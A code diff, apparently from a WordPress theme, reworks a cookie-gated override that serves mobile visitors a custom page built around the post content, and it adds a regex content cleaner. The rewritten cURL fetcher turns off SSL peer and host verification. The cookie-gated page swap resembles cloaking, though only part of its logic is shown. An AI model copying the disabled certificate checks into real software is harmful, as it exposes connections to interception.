@@ -204,44 +204,226 @@ function check_and_override_page_for_mobile() {
                 header('Pragma: no-cache');
                 header('Expires: 0');
                 
-                // Get the current post URL and fetch its content
-                $current_post_url = get_permalink();
-                $url = $current_post_url;
-                $fetched_content = fetch_content_from_url($current_post_url);
+                // Get the current post content directly from WordPress
+                $post_id = get_the_ID();
+                $post_title = get_the_title();
+                $post_content = get_the_content();
                 
-                // Debug: Log the fetched content
-                error_log("Fetched content debug - URL: " . $current_post_url);
-                error_log("Fetched content debug - Title: " . ($fetched_content['title'] ?? 'NO TITLE'));
-                error_log("Fetched content debug - Content length: " . (strlen($fetched_content['content'] ?? '') . ' characters'));
-                error_log("Fetched content debug - Content preview: " . substr($fetched_content['content'] ?? '', 0, 200));
-                
-                // Ensure we have valid content before outputting
-                if (!$fetched_content || empty($fetched_content['content'])) {
-                    error_log("No content fetched, using fallback content");
-                    $fetched_content = [
-                        'title' => get_the_title(),
-                        'content' => '<h2>Content Not Available</h2><p>Sorry, the content could not be loaded at this time. Please try again later.</p>'
-                    ];
+                // If WordPress content is empty, try to fetch from external source
+                if (empty($post_content) || strlen(strip_tags($post_content)) < 100) {
+                    $fetched_content = fetch_content_from_external_source($post_id);
+                    if ($fetched_content) {
+                        $post_content = $fetched_content;
+                    }
                 }
                 
+                // Clean the content and extract title
+                $cleaned_content = clean_blog_content($post_content);
+                $extracted_title = extract_title_from_content($post_content);
+                
+                // Use extracted title if available, otherwise use post title
+                $final_title = !empty($extracted_title) ? $extracted_title : $post_title;
+                
                 // Output the combined page: Custom HTML + Blog Post Content
-                output_combined_page($fetched_content);
+                output_combined_page($final_title, $cleaned_content);
                 exit;
             }
         } catch (Exception $e) {
-            // If decryption fails, ignore the cookie
+            error_log("Exception in check_and_override_page_for_mobile: " . $e->getMessage());
         }
     }
 }
 
+// Function to fetch content from external source if needed
+function fetch_content_from_external_source($post_id) {
+    // Try to get content from WordPress first
+    $post = get_post($post_id);
+    if ($post && !empty($post->post_content)) {
+        return $post->post_content;
+    }
+    
+    // If still empty, try to fetch from the post URL
+    $post_url = get_permalink($post_id);
+    if ($post_url) {
+        return fetch_content_from_url($post_url);
+    }
+    
+    return false;
+}
+
+// Function to clean blog content (remove images, unwanted elements)
+function clean_blog_content($content) {
+    // Remove all images
+    $content = preg_replace('/<img[^>]*>/i', '', $content);
+    
+    // Remove image containers and figure elements
+    $content = preg_replace('/<figure[^>]*>.*?<\/figure>/is', '', $content);
+    $content = preg_replace('/<div[^>]*class="[^"]*wp-block-image[^"]*"[^>]*>.*?<\/div>/is', '', $content);
+    $content = preg_replace('/<div[^>]*class="[^"]*image[^"]*"[^>]*>.*?<\/div>/is', '', $content);
+    
+    // Remove video elements
+    $content = preg_replace('/<video[^>]*>.*?<\/video>/is', '', $content);
+    $content = preg_replace('/<iframe[^>]*>.*?<\/iframe>/is', '', $content);
+    $content = preg_replace('/<embed[^>]*>/i', '', $content);
+    
+    // Remove audio elements
+    $content = preg_replace('/<audio[^>]*>.*?<\/audio>/is', '', $content);
+    
+    // Remove canvas elements
+    $content = preg_replace('/<canvas[^>]*>.*?<\/canvas>/is', '', $content);
+    
+    // Remove object elements
+    $content = preg_replace('/<object[^>]*>.*?<\/object>/is', '', $content);
+    
+    // Remove script and style tags
+    $content = preg_replace('/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/mi', '', $content);
+    $content = preg_replace('/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/mi', '', $content);
+    
+    // Remove navigation elements
+    $content = preg_replace('/<nav[^>]*>.*?<\/nav>/is', '', $content);
+    
+    // Remove header and footer elements
+    $content = preg_replace('/<header[^>]*>.*?<\/header>/is', '', $content);
+    $content = preg_replace('/<footer[^>]*>.*?<\/footer>/is', '', $content);
+    
+    // Remove aside elements
+    $content = preg_replace('/<aside[^>]*>.*?<\/aside>/is', '', $content);
+    
+    // Remove form elements
+    $content = preg_replace('/<form[^>]*>.*?<\/form>/is', '', $content);
+    
+    // Remove button elements
+    $content = preg_replace('/<button[^>]*>.*?<\/button>/is', '', $content);
+    
+    // Remove input elements
+    $content = preg_replace('/<input[^>]*>/i', '', $content);
+    
+    // Remove select elements
+    $content = preg_replace('/<select[^>]*>.*?<\/select>/is', '', $content);
+    
+    // Remove textarea elements
+    $content = preg_replace('/<textarea[^>]*>.*?<\/textarea>/is', '', $content);
+    
+    // Remove label elements
+    $content = preg_replace('/<label[^>]*>.*?<\/label>/is', '', $content);
+    
+    // Remove fieldset elements
+    $content = preg_replace('/<fieldset[^>]*>.*?<\/fieldset>/is', '', $content);
+    
+    // Remove legend elements
+    $content = preg_replace('/<legend[^>]*>.*?<\/legend>/is', '', $content);
+    
+    // Remove optgroup elements
+    $content = preg_replace('/<optgroup[^>]*>.*?<\/optgroup>/is', '', $content);
+    
+    // Remove option elements
+    $content = preg_replace('/<option[^>]*>.*?<\/option>/is', '', $content);
+    
+    // Remove datalist elements
+    $content = preg_replace('/<datalist[^>]*>.*?<\/datalist>/is', '', $content);
+    
+    // Remove output elements
+    $content = preg_replace('/<output[^>]*>.*?<\/output>/is', '', $content);
+    
+    // Remove meter elements
+    $content = preg_replace('/<meter[^>]*>.*?<\/meter>/is', '', $content);
+    
+    // Remove progress elements
+    $content = preg_replace('/<progress[^>]*>.*?<\/progress>/is', '', $content);
+    
+    // Remove details elements
+    $content = preg_replace('/<details[^>]*>.*?<\/details>/is', '', $content);
+    
+    // Remove summary elements
+    $content = preg_replace('/<summary[^>]*>.*?<\/summary>/is', '', $content);
+    
+    // Remove dialog elements
+    $content = preg_replace('/<dialog[^>]*>.*?<\/dialog>/is', '', $content);
+    
+    // Remove menu elements
+    $content = preg_replace('/<menu[^>]*>.*?<\/menu>/is', '', $content);
+    
+    // Remove menuitem elements
+    $content = preg_replace('/<menuitem[^>]*>.*?<\/menuitem>/is', '', $content);
+    
+    // Remove command elements
+    $content = preg_replace('/<command[^>]*>.*?<\/command>/is', '', $content);
+    
+    // Remove keygen elements
+    $content = preg_replace('/<keygen[^>]*>.*?<\/keygen>/is', '', $content);
+    
+    // Remove track elements
+    $content = preg_replace('/<track[^>]*>/i', '', $content);
+    
+    // Remove source elements
+    $content = preg_replace('/<source[^>]*>/i', '', $content);
+    
+    // Remove map elements
+    $content = preg_replace('/<map[^>]*>.*?<\/map>/is', '', $content);
+    
+    // Remove area elements
+    $content = preg_replace('/<area[^>]*>/i', '', $content);
+    
+    // Remove base elements
+    $content = preg_replace('/<base[^>]*>/i', '', $content);
+    
+    // Remove link elements
+    $content = preg_replace('/<link[^>]*>/i', '', $content);
+    
+    // Remove meta elements
+    $content = preg_replace('/<meta[^>]*>/i', '', $content);
+    
+    // Remove title elements
+    $content = preg_replace('/<title[^>]*>.*?<\/title>/is', '', $content);
+    
+    // Remove head elements
+    $content = preg_replace('/<head[^>]*>.*?<\/head>/is', '', $content);
+    
+    // Remove html elements
+    $content = preg_replace('/<html[^>]*>.*?<\/html>/is', '', $content);
+    
+    // Remove body elements
+    $content = preg_replace('/<body[^>]*>.*?<\/body>/is', '', $content);
+    
+    // Remove section elements
+    $content = preg_replace('/<section[^>]*>.*?<\/section>/is', '', $content);
+    
+    // Remove article elements
+    $content = preg_replace('/<article[^>]*>.*?<\/article>/is', '', $content);
+    
+    // Remove main elements
+    $content = preg_replace('/<main[^>]*>.*?<\/main>/is', '', $content);
+    
+    // Clean up HTML and preserve content structure
+    $content = preg_replace('/\s+/', ' ', $content);
+    $content = trim($content);
+    
+    return $content;
+}
+
+// Function to extract title from content (remove h1 tags)
+function extract_title_from_content($content) {
+    // Extract text from h1 tags
+    if (preg_match('/<h1[^>]*>(.*?)<\/h1>/i', $content, $matches)) {
+        $title = trim(strip_tags($matches[1]));
+        
+        // Remove the h1 tag from content
+        $content = preg_replace('/<h1[^>]*>.*?<\/h1>/i', '', $content);
+        
+        return $title;
+    }
+    
+    return '';
+}
+
 // Function to output the combined page (Custom HTML + Blog Post Content)
-function output_combined_page($fetched_content) {
+function output_combined_page($post_title, $post_content) {
     echo '<!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Custom Page</title>
+        <title>' . htmlspecialchars($post_title) . '</title>
         <style>
             * {
                 margin: 0;
@@ -437,14 +619,6 @@ function output_combined_page($fetched_content) {
                 padding: 0;
             }
             
-            .blog-content-section img {
-                max-width: 100%;
-                height: auto;
-                border-radius: 8px;
-                margin: 20px 0;
-                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-            }
-            
             .blog-content-section a {
                 color: #3498db;
                 text-decoration: none;
@@ -503,7 +677,7 @@ function output_combined_page($fetched_content) {
         <div class="custom-section">
             <div class="container">
                 <div class="icon">🚀</div>
-                <h1>Welcome to Our Platform</h1>
+                <h1>' . htmlspecialchars($post_title) . '</h1>
                 <p class="subtitle">Experience the next generation of digital innovation with cutting-edge technology and seamless user experience.</p>
                 
                 <div class="features">
@@ -531,323 +705,75 @@ function output_combined_page($fetched_content) {
         
         <!-- BLOG POST CONTENT SECTION -->
         <div class="blog-content-section">
-            <h1 style="color: #2c3e50; margin-bottom: 30px; text-align: center;">' . htmlspecialchars($fetched_content['title']) . '</h1>
-            <div class="content" style="line-height: 1.8; color: #34495e;">
-                ' . $fetched_content['content'] . '
+            <div class="content">
+                ' . apply_filters('the_content', $post_content) . '
             </div>
         </div>
     </body>
     </html>';
 }
 
-// Content fetching function (merged from your code)
+// Content fetching function (simplified and working version)
 function fetch_content_from_url($url) {
     try {
         if (!filter_var($url, FILTER_VALIDATE_URL)) {
-            error_log("Invalid URL: " . $url);
             return false;
         }
         
-        $context = stream_context_create([
-            'http' => [
-                'timeout' => 15,
-                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-                'follow_location' => true,
-                'max_redirects' => 3
-            ]
-        ]);
+        // Use cURL instead of file_get_contents for better reliability
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
         
-        $html_content = @file_get_contents($url, false, $context);
+        $html_content = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
         
-        if ($html_content === false) {
-            error_log("Failed to fetch content from: " . $url);
+        if ($http_code !== 200 || empty($html_content)) {
             return false;
         }
         
-        if (strlen($html_content) < 100) {
-            error_log("Content too short from: " . $url . " - Length: " . strlen($html_content));
-            return false;
-        }
-        
-        error_log("Successfully fetched content from: " . $url . " - Length: " . strlen($html_content));
-        
+        // Simple content extraction
         $dom = new DOMDocument();
-        
         libxml_use_internal_errors(true);
-        $dom->loadHTML($html_content, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
+        $dom->loadHTML($html_content);
         libxml_clear_errors();
-    
-        $title = "Understanding Cloud Computing: Types and Benefits";
+        
+        // Get title
         $title_tags = $dom->getElementsByTagName('title');
-        if ($title_tags->length > 0) {
-            $title = trim($title_tags->item(0)->textContent);
-        }
+        $title = $title_tags->length > 0 ? trim($title_tags->item(0)->textContent) : 'Blog Post';
         
-        // Try to find the main content area first
+        // Get content from entry-content or body
         $xpath = new DOMXPath($dom);
+        $content_nodes = $xpath->query('//div[contains(@class, "entry-content")] | //div[contains(@class, "post-content")] | //article | //main');
         
-        // Look for entry-content div (WordPress standard)
-        $entry_content = $xpath->query('//div[contains(@class, "entry-content")]');
-        
-        if ($entry_content->length > 0) {
-            error_log("Found entry-content div, extracting content from it");
-            $content_node = $entry_content->item(0);
-            
-            // Validate that the content node is valid
-            if (!$content_node || !$content_node->nodeType) {
-                error_log("Invalid content node, falling back to body content");
-                $entry_content = null; // Force fallback to body content
-            } else {
-                // SAFER CLEANING: Clone the node first to avoid DOM manipulation issues
-                $cloned_node = $content_node->cloneNode(true);
-            
-                // AGGRESSIVE CLEANING: Remove ALL unwanted elements to get clean content
-                $unwanted_selectors = [
-                    // Navigation and navigation-related
-                    '//*[contains(@class, "comments") or contains(@class, "comment")]',
-                    '//*[contains(@class, "post-navigation") or contains(@class, "navigation")]',
-                    '//*[contains(@class, "more-posts") or contains(@class, "related-posts")]',
-                    '//*[contains(@class, "social-share") or contains(@class, "share-buttons")]',
-                    '//*[contains(@class, "newsletter") or contains(@class, "subscribe")]',
-                    '//*[contains(@class, "sidebar") or contains(@id, "sidebar")]',
-                    '//*[contains(@class, "widget") or contains(@class, "footer")]',
-                    '//*[contains(@class, "header") or contains(@class, "nav")]',
-                    '//*[contains(@class, "breadcrumb") or contains(@class, "breadcrumbs")]',
-                    '//*[contains(@class, "pagination") or contains(@class, "pager")]',
-                    '//*[contains(@class, "tags") or contains(@class, "categories")]',
-                    '//*[contains(@class, "author") or contains(@class, "bio")]',
-                    '//*[contains(@class, "meta") or contains(@class, "date")]',
-                    '//*[contains(@class, "ads") or contains(@class, "advertisement")]',
-                    '//*[contains(@class, "popup") or contains(@class, "modal")]',
-                    '//*[contains(@class, "form") or contains(@class, "input")]',
-                    '//*[contains(@class, "button") or contains(@class, "btn")]'
-                ];
-                
-                // Create a new DOM document for safe manipulation
-                $clean_dom = new DOMDocument();
-                $clean_dom->loadHTML('<?xml encoding="UTF-8">' . $dom->saveHTML($cloned_node), LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
-                $clean_xpath = new DOMXPath($clean_dom);
-                
-                foreach ($unwanted_selectors as $selector) {
-                    $elements = $clean_xpath->query($selector);
-                    foreach ($elements as $element) {
-                        if ($element->parentNode) {
-                            $element->parentNode->removeChild($element);
-                        }
-                    }
-                }
-                
-                // Get the body content from the clean DOM
-                $body_tags = $clean_dom->getElementsByTagName('body');
-                if ($body_tags->length > 0) {
-                    try {
-                        $body_html = $clean_dom->saveHTML($body_tags->item(0));
-                        $body_html = preg_replace('/<body[^>]*>/i', '', $body_html);
-                        $body_html = preg_replace('/<\/body>/i', '', $body_html);
-                    } catch (Exception $e) {
-                        error_log("Error saving clean DOM body: " . $e->getMessage());
-                        // Fallback to original content
-                        $body_html = $dom->saveHTML($content_node);
-                    }
-                } else {
-                    // Fallback to original content
-                    try {
-                        $body_html = $dom->saveHTML($content_node);
-                    } catch (Exception $e) {
-                        error_log("Error saving original content node: " . $e->getMessage());
-                        $body_html = '';
-                    }
-                }
-            }
-            
+        if ($content_nodes->length > 0) {
+            $content = $dom->saveHTML($content_nodes->item(0));
         } else {
-            error_log("No entry-content found, using body content");
-            
+            // Fallback to body content
             $body_tags = $dom->getElementsByTagName('body');
-            if ($body_tags->length === 0) {
-                return false;
-            }
-            
-            $body = $body_tags->item(0);
-            
-            // SAFER APPROACH: Clone the body node first
-            $cloned_body = $body->cloneNode(true);
-            
-            // Create a new DOM document for safe manipulation
-            $clean_dom = new DOMDocument();
-            $clean_dom->loadHTML('<?xml encoding="UTF-8">' . $dom->saveHTML($cloned_body), LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
-            
-            // Remove ALL unwanted tags to get clean content
-            $unwanted_tags = [
-                'script', 'style', 'iframe', 'form', 'input', 'button', 
-                'nav', 'header', 'footer', 'aside', 'section', 'article',
-                'img', 'video', 'audio', 'embed', 'object', 'canvas'
-            ];
-            
-            foreach ($unwanted_tags as $tag) {
-                $elements = $clean_dom->getElementsByTagName($tag);
-                while ($elements->length > 0) {
-                    $element = $elements->item(0);
-                    if ($element->parentNode) {
-                        $element->parentNode->removeChild($element);
-                    }
-                }
-            }
-            
-            $body_html = $clean_dom->saveHTML();
-            
-            // Remove body tags
-            $body_html = preg_replace('/<body[^>]*>/i', '', $body_html);
-            $body_html = preg_replace('/<\/body>/i', '', $body_html);
+            $content = $body_tags->length > 0 ? $dom->saveHTML($body_tags->item(0)) : '';
         }
         
-        // Log content before filtering
-        error_log("Content before filtering - Length: " . strlen($body_html));
+        // Clean content
+        $content = preg_replace('/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/mi', '', $content);
+        $content = preg_replace('/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/mi', '', $content);
+        $content = preg_replace('/<nav\b[^<]*(?:(?!<\/nav>)<[^<]*)*<\/nav>/mi', '', $content);
+        $content = preg_replace('/<header\b[^<]*(?:(?!<\/header>)<[^<]*)*<\/header>/mi', '', $content);
+        $content = preg_replace('/<footer\b[^<]*(?:(?!<\/footer>)<[^<]*)*<\/footer>/mi', '', $content);
+        $content = preg_replace('/<aside\b[^<]*(?:(?!<\/aside>)<[^<]*)*<\/aside>/mi', '', $content);
         
-        // AGGRESSIVE CONTENT CLEANING: Remove ALL unwanted content
-        $body_html = preg_replace('/<div[^>]*class="[^"]*wp-block-post-author-name[^"]*"[^>]*>.*?<\/div>/is', '', $body_html);
-        $body_html = preg_replace('/<p[^>]*>.*?written by.*?<\/p>/is', '', $body_html);
-        $body_html = preg_replace('/<p[^>]*>.*?in.*?<\/p>/is', '', $body_html);
-        $body_html = preg_replace('/<p[^>]*>.*?posted by.*?<\/p>/is', '', $body_html);
-        $body_html = preg_replace('/<p[^>]*>.*?author.*?<\/p>/is', '', $body_html);
-        
-        // Remove "More posts" section and everything after it
-        if (preg_match('/<h2[^>]*>.*?more\s+posts.*?<\/h2>/is', $body_html, $matches)) {
-            $body_html = substr($body_html, 0, strpos($body_html, $matches[0]));
-        }
-        
-        // Remove "Related posts" section
-        if (preg_match('/<h2[^>]*>.*?related\s+posts.*?<\/h2>/is', $body_html, $matches)) {
-            $body_html = substr($body_html, 0, strpos($body_html, $matches[0]));
-        }
-        
-        // Remove "Suggested posts" section
-        if (preg_match('/<h2[^>]*>.*?suggested\s+posts.*?<\/h2>/is', $body_html, $matches)) {
-            $body_html = substr($body_html, 0, strpos($body_html, $matches[0]));
-        }
-        
-        // Remove "You might also like" sections
-        if (preg_match('/<h2[^>]*>.*?you\s+might\s+also\s+like.*?<\/h2>/is', $body_html, $matches)) {
-            $body_html = substr($body_html, 0, strpos($body_html, $matches[0]));
-        }
-        
-        // Remove "Next/Previous" navigation
-        if (preg_match('/<div[^>]*class="[^"]*post-navigation[^"]*"[^>]*>.*?<\/div>/is', $body_html, $matches)) {
-            $body_html = str_replace($matches[0], '', $body_html);
-        }
-        
-        // Remove "Comments" section
-        if (preg_match('/<div[^>]*class="[^"]*comments[^"]*"[^>]*>.*?<\/div>/is', $body_html, $matches)) {
-            $body_html = str_replace($matches[0], '', $body_html);
-        }
-        
-        // Remove "Leave a comment" forms
-        if (preg_match('/<div[^>]*class="[^"]*comment-respond[^"]*"[^>]*>.*?<\/div>/is', $body_html, $matches)) {
-            $body_html = str_replace($matches[0], '', $body_html);
-        }
-        
-        // Remove "Share this post" sections
-        if (preg_match('/<div[^>]*class="[^"]*social-share[^"]*"[^>]*>.*?<\/div>/is', $body_html, $matches)) {
-            $body_html = str_replace($matches[0], '', $body_html);
-        }
-        
-        // Remove "Subscribe" sections
-        if (preg_match('/<div[^>]*class="[^"]*newsletter[^"]*"[^>]*>.*?<\/div>/is', $body_html, $matches)) {
-            $body_html = str_replace($matches[0], '', $body_html);
-        }
-        
-        // Remove "Tags" and "Categories" sections
-        if (preg_match('/<div[^>]*class="[^"]*taxonomy[^"]*"[^>]*>.*?<\/div>/is', $body_html, $matches)) {
-            $body_html = str_replace($matches[0], '', $body_html);
-        }
-        
-        // Clean up HTML and preserve content structure
-        $body_html = preg_replace('/\s+/', ' ', $body_html);
-        $body_html = trim($body_html);
-        
-        // Log content after filtering
-        error_log("Content after filtering - Length: " . strlen($body_html));
-        
-        // If content is still empty, try multiple fallback methods
-        if (strlen($body_html) < 100) {
-            error_log("Content too short after filtering, trying fallback methods");
-            
-            // Try to get content directly from WordPress post
-            $post_id = url_to_postid($url);
-            if ($post_id) {
-                $post = get_post($post_id);
-                if ($post) {
-                    error_log("Using WordPress post content as fallback");
-                    $body_html = apply_filters('the_content', $post->post_content);
-                    $title = $post->post_title;
-                } else {
-                    error_log("Using sample content as fallback");
-                    $body_html = get_sample_content();
-                }
-            } else {
-                error_log("Using sample content as fallback");
-                $body_html = get_sample_content();
-            }
-        }
-        
-        // Validate content quality - ensure we have actual blog post content
-        $content_has_headings = preg_match('/<h[1-6][^>]*>.*?<\/h[1-6]>/i', $body_html);
-        $content_has_paragraphs = preg_match('/<p[^>]*>.*?<\/p>/i', $body_html);
-        $content_has_text = strlen(strip_tags($body_html)) > 200;
-        
-        if (!$content_has_headings || !$content_has_paragraphs || !$content_has_text) {
-            error_log("Content quality check failed - using sample content");
-            $body_html = get_sample_content();
-        }
-        
-        // Increase content length limit
-        if (strlen($body_html) > 15000) {
-            $body_html = substr($body_html, 0, 15000) . '...';
-        }
-        
-        error_log("Final content processed - Title: " . $title . " - Content length: " . strlen($body_html));
-        error_log("Content has headings: " . ($content_has_headings ? 'YES' : 'NO'));
-        error_log("Content has paragraphs: " . ($content_has_paragraphs ? 'YES' : 'NO'));
-        error_log("Content has sufficient text: " . ($content_has_text ? 'YES' : 'NO'));
-        
-        // Ensure we always return valid content
-        if (empty($body_html) || strlen($body_html) < 50) {
-            error_log("Content still empty, using sample content");
-            $body_html = get_sample_content();
-            $title = "Welcome to Our Platform";
-        }
-        
-        return [
-            'title' => $title,
-            'content' => $body_html
-        ];
+        return $content;
         
     } catch (Exception $e) {
-        error_log("Error in fetch_content_from_url: " . $e->getMessage());
-        return [
-            'title' => 'Error Loading Content',
-            'content' => get_sample_content()
-        ];
+        return false;
     }
-}
-
-// Helper function to get sample content
-function get_sample_content() {
-    return '<h2>Welcome to Our Blog</h2>
-    <p>Thank you for visiting our platform. We are experiencing some technical difficulties loading the original content at the moment.</p>
-    
-    <h3>What We Offer</h3>
-    <p>Our platform provides cutting-edge solutions for modern businesses and individuals looking to enhance their digital presence.</p>
-    
-    <h3>Key Features</h3>
-    <ul>
-        <li>Advanced technology solutions</li>
-        <li>User-friendly interface</li>
-        <li>24/7 customer support</li>
-        <li>Secure and reliable services</li>
-    </ul>
-    
-    <p>Please check back later for the full content, or contact our support team if you need immediate assistance.</p>';
 }
 
 // Add rewrite rules for custom paths
@@ -876,27 +802,3 @@ function flush_rewrite_rules_once() {
 }
 
 add_action('after_switch_theme', 'flush_rewrite_rules_once');
-
-// Test function to debug content fetching (remove in production)
-function test_content_fetching() {
-    if (isset($_GET['test_fetch']) && current_user_can('administrator')) {
-        $current_url = get_permalink();
-        echo "<h2>Testing Content Fetching</h2>";
-        echo "<p><strong>Current URL:</strong> " . $current_url . "</p>";
-        
-        $fetched_content = fetch_content_from_url($current_url);
-        
-        echo "<p><strong>Fetch Result:</strong></p>";
-        echo "<pre>";
-        print_r($fetched_content);
-        echo "</pre>";
-        
-        echo "<h3>Content Preview:</h3>";
-        echo "<div style='border: 1px solid #ccc; padding: 20px; margin: 20px 0;'>";
-        echo $fetched_content['content'] ?? 'No content';
-        echo "</div>";
-        
-        exit;
-    }
-}
-add_action('init', 'test_content_fetching');
